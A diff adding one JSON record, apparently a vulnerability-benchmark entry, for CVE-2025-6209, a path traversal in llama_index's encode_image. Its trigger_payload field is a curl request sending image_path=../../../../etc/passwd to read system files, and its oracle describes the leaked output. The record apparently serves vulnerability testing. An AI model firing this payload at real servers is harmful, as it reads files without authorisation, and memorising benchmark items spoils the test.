@@ -1,0 +1,15 @@
+{
+  "file_id": "266_llama-index_huntr_e89d14f8-bfe8-4c9a-bb2a-656c01cc9a68",
+  "numeric_id": "266",
+  "library_hint": "llama-index",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in generic_utils.py allows arbitrary file read via unvalidated image_path input",
+  "cve": "CVE-2025-6209",
+  "cwe": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+  "library": "llama_index",
+  "affected_version": "< 0.12.41",
+  "vulnerable_function": "encode_image",
+  "triggerability": "direct",
+  "trigger_payload": "curl -X POST -F \"image_path=../../../../etc/passwd\" {BASE_URL}/upload",
+  "oracle": "The server returns the base64-encoded content of the file at the specified path, such as /etc/passwd"
+}
